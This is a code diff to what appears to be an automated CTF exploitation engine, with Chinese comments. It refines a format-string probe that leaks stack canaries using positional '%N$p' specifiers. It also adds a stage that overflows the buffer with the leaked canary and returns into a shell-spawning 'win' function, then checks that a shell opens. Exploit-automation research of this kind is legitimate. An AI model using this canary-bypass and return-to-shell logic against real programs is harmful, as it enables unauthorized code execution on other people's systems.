@@ -429,7 +429,25 @@ def _try_canary_fmt(ch: Challenge, f: Facts, plan: S.Plan, post_cmds: list = Non
         return False, "missing plt/got/libc", b""
 
     bits = ch.elf.bits
-    probe = b"AAAA." + b".%p" * 60
+    # probe 长度受第一次 read 的 size_limit 限制（cannary 实测：184B probe > 32B
+    # limit 被 read 截断，fmt 串残缺 → 泄漏失败）。用位置参数 %N$p 精准打 canary
+    # 附近的槽：canary arg = 6 + canary_off/wordsize（amd64），前后各扫 2 格。
+    probe_limits = [v.size_limit for v in f.vulns
+                    if v.sink in S.TERM_SINKS or v.sink == "read"]
+    probe_limit = min((x for x in probe_limits if x), default=120)
+    # canary_off 由帧偏移推算（与 stage1 同公式）
+    word = ch.wordsize
+    canary_off0 = (off - word) - (8 if bits == 64 else 12)
+    # printf(fmt) 变参 arg1=rsi…arg5=r9、arg6=[rsp] 起；canary 落 arg6+canary_off/word
+    # （cannary 实测 arg11 = 6 + 40/8）
+    arg0 = 6 + (canary_off0 // word if canary_off0 > 0 else 0)
+    fmt_dollar = bytes([0x24])   # 显式 0x24，防外层 shell/python 转义差异
+    args_n = [a for a in range(max(6, arg0 - 2), arg0 + 3)]
+    probe = b"AAAA" + b"".join(b"-%" + str(a).encode() + fmt_dollar + b"p"
+                               for a in args_n)
+    if len(probe) > probe_limit:
+        # 位置串太长：只打中心格（cannary：'AAAA-%11$p' = 11 字节 ✓）
+        probe = b"AAAA-%" + str(arg0).encode() + fmt_dollar + b"p"
 
     for cand in range(8):
         try:
@@ -440,7 +458,11 @@ def _try_canary_fmt(ch: Challenge, f: Facts, plan: S.Plan, post_cmds: list = Non
         try:
             _t.sleep(0.1)
             out += p.recvrepeat(0.06)
-            # ---- 第一次 gets：格式化字符串泄漏
+            # ---- fmt 漏洞可能位于「先跑的一次 read + printf」（cannary 型：vuln 函数
+            # 先执行、printf(buf) 只跑一次），泄漏必须喂给 fmt 所在的那次 read；
+            # 溢出 read 是另一次。两个 vuln 按 call_addr 排序：fmt 的 sink 是 printf
+            # 前紧邻的 read（size_limit 小），溢出是后一个（limit 大）。
+            # 引擎按 (probe → 等) → (stage1 → 等) 两步发送，天然适配先后顺序。
             p.send(probe + b"\n" if sink in S.TERM_SINKS else probe)
             _t.sleep(0.2)
             out += p.recvrepeat(0.2)
@@ -453,14 +475,31 @@ def _try_canary_fmt(ch: Challenge, f: Facts, plan: S.Plan, post_cmds: list = Non
                 return False, "candidates exhausted", out
             canary = cands[cand]
 
-            # ---- 第二次 gets：带 canary 溢出，泄漏 GOT 后回 main
-            # canary 在 rbp-0xc(i386) / rbp-0x8(amd64)，由帧偏移推算它在缓冲区后的位置
+            # ---- 第二次 gets：带 canary 溢出。有 backdoor（execve/system win）时
+            # 直接跳 win（cannary 型：无 pop_rdi 也能打）；否则走泄漏 GOT 回 main。
             rbp_disp = off - ch.wordsize
             canary_off = rbp_disp - (8 if bits == 64 else 12)
             if canary_off <= 0:
                 continue
             pad = b"A" * canary_off
             tail = b"B" * (off - canary_off - ch.wordsize)
+            shell_win = f.shell_win
+            if shell_win is not None and not getattr(ch, "host", None):
+                # 本地 + 有 win：直接 ret 到 win（无参数需求，execve('/bin/sh') 型）
+                if bits == 64:
+                    ret_g = f.gadgets.get("ret")
+                    chain = (ch.p64(ret_g) if ret_g else b"") + ch.p64(shell_win.addr)
+                else:
+                    chain = ch.p32(shell_win.addr)
+                stage1 = pad + ch.p64(canary) + tail + chain
+                p.send(stage1 + (b"\n" if sink in S.TERM_SINKS else b""))
+                _t.sleep(0.3)
+                out += p.recvrepeat(0.3)
+                r = verify_shell(p, timeout=_verify_timeout(ch), post_cmds=post_cmds)
+                out += r.output
+                if r.ok:
+                    return True, f"canary={hex(canary)} -> win {hex(shell_win.addr)}", out, r.cmds
+                continue
             if bits == 64:
                 ret = f.gadgets.get("ret")
                 pop_rdi = f.gadgets.get("pop_rdi")
